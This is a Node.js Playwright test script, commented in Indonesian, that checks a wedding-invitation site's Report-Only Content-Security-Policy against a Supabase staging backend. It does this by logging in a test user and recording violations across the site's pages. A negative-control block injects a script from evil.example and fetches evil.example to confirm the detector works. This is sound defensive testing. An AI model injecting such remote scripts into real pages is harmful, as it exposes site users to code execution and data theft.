// Uji CSP (Report-Only) situs LAMA pada alur nyata terhadap Supabase STAGING, memakai Chromium (Playwright).
// Situs disajikan lokal; /assets/config.js diganti ke URL+anon key staging (bukan produksi). Header CSP-Report-Only diambil dari .htaccess.
// Pelanggaran dicatat lewat event securitypolicyviolation. Tidak ada pembayaran; tidak ada kunci dicetak.
import http from "node:http";
import { readFileSync, existsSync, statSync } from "node:fs";
import { join, extname, resolve } from "node:path";
import { chromium } from "playwright";
import { check, info, finish, svc, mkUser, URL_, ANON } from "./lib.mjs";

const ROOT = resolve(new URL("../../", import.meta.url).pathname);
const ht = readFileSync(join(ROOT, ".htaccess"), "utf8");
const CSP = (ht.match(/Content-Security-Policy-Report-Only\s+"([^"]+)"/) || [])[1];
if (!CSP) { console.error("CSP Report-Only tidak ditemukan di .htaccess"); process.exit(2); }
if (URL_.includes("ixzmogwaaajkyltcnwaf")) { console.error("URL mengarah ke PRODUKSI. Dihentikan."); process.exit(2); }
const MIME = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css", ".svg": "image/svg+xml", ".png": "image/png", ".webp": "image/webp", ".mp3": "audio/mpeg", ".json": "application/json", ".ico": "image/x-icon" };
const srv = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x"); let p = decodeURIComponent(u.pathname);
  const hdr = { "Content-Security-Policy-Report-Only": CSP, "X-Content-Type-Options": "nosniff" };
  if (p === "/assets/config.js") { res.writeHead(200, { ...hdr, "Content-Type": MIME[".js"] }); return res.end(`window.NM_CONFIG=${JSON.stringify({ SUPABASE_URL: URL_, SUPABASE_ANON_KEY: ANON, SITE_URL: "" })};`); }
  let f = join(ROOT, p === "/" ? "index.html" : p);
  if (!f.startsWith(ROOT)) { res.writeHead(403); return res.end(); }
  if (!existsSync(f) || statSync(f).isDirectory()) { f = existsSync(f + ".html") ? f + ".html" : existsSync(join(f, "index.html")) ? join(f, "index.html") : ""; }
  if (!f) { res.writeHead(404, hdr); return res.end("404"); }
  res.writeHead(200, { ...hdr, "Content-Type": MIME[extname(f)] || "application/octet-stream" }); res.end(readFileSync(f));
});
await new Promise((r) => srv.listen(0, "127.0.0.1", r));
const BASE = "http://127.0.0.1:" + srv.address().port;

const stamp = Date.now().toString(36), email = `csp.${stamp}@uji.nusamora.test`, PW = "Uji-Sandi-Panjang#2026";
const u = await mkUser(email, PW);
const inv = await svc.from("invitations").insert({ user_id: u.id, title: "Uji CSP " + stamp, category: "wedding", slug: "csp-" + stamp, event_date: "2027-01-15", status: "draft",
  content: { names: { a: "Andi", b: "Sari" }, event: { start: "10:00", venue: "Gedung Uji" }, photos: { cover: "https://example.test/cover.webp", gallery: [] }, design2d: { palette: "rose" } } }).select("id").single();
check("data uji dibuat di staging", !inv.error, inv.error?.message);

const browser = await chromium.launch();
const ctx = await browser.newContext();
const viol = []; let cur = "-";
await ctx.exposeFunction("__cspv", (v) => viol.push({ page: cur, ...v }));
await ctx.addInitScript(() => { document.addEventListener("securitypolicyviolation", (e) => { try { window.__cspv({ dir: e.effectiveDirective, blocked: String(e.blockedURI).slice(0, 120), src: String(e.sourceFile || "").slice(-60), disp: e.disposition }); } catch (_) {} }); });
const page = await ctx.newPage();
const errs = []; page.on("pageerror", (e) => errs.push(cur + ": " + String(e.message).slice(0, 120)));
const visit = async (path, wait = 2500) => { cur = path; try { await page.goto(BASE + path, { waitUntil: "load", timeout: 30000 }); await page.waitForTimeout(wait); } catch (e) { errs.push(path + " goto: " + e.message.slice(0, 100)); } return page.url().replace(BASE, ""); };

const pub = ["/", "/masuk", "/daftar", "/lupa-password", "/paket", "/template?paket=essential", "/live/jawa-tengah.html"];
for (const p of pub) { const end = await visit(p); info("publik " + p, { akhir: end }); }

// login lewat UI (alur nyata ke GoTrue staging)
cur = "/masuk (login)"; await page.goto(BASE + "/masuk?next=/akun"); await page.fill("#email", email); await page.fill("#pw", PW); await page.click("#go");
try { await page.waitForURL((u) => new URL(u).pathname === "/akun", { timeout: 20000 }); } catch { /* dicek di bawah */ }
check("login lewat UI berhasil (diarahkan ke /akun)", new URL(page.url()).pathname === "/akun", page.url().replace(BASE, ""));
await page.waitForTimeout(3000);
for (const p of ["/akun", `/editor?id=${inv.data?.id}`, `/preview?id=${inv.data?.id}`, "/pembayaran?order_id=NM000000000000"]) { const end = await visit(p, 3500); info("login " + p.split("?")[0], { akhir: end }); }
cur = "/admin (non-admin)"; const endAdmin = await visit("/admin", 2500); info("admin oleh non-admin", { akhir: endAdmin });

// kontrol negatif: alat harus menangkap pelanggaran sungguhan
await visit("/masuk", 500); cur = "KONTROL-NEGATIF";
await page.evaluate(() => { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; document.head.appendChild(s); fetch("https://evil.example/api").catch(() => {}); });
await page.waitForTimeout(1500);
const neg = viol.filter((v) => v.page === "KONTROL-NEGATIF");
check("kontrol negatif: skrip/fetch ke evil.example terdeteksi", neg.some((v) => v.dir === "script-src-elem") && neg.some((v) => v.dir === "connect-src"), JSON.stringify(neg));

const real = viol.filter((v) => v.page !== "KONTROL-NEGATIF");
const uniq = [...new Map(real.map((v) => [v.page + "|" + v.dir + "|" + v.blocked, v])).values()];
info("pelanggaran CSP (Report-Only) pada alur nyata", { jumlah: real.length, unik: uniq.slice(0, 40) });
check("0 pelanggaran CSP pada alur situs lama (publik + login + akun/editor/preview/pembayaran)", real.length === 0, JSON.stringify(uniq.slice(0, 8)));
info("galat JavaScript halaman", errs.slice(0, 20));
await browser.close(); srv.close();
await svc.auth.admin.deleteUser(u.id).catch(() => {});
finish();
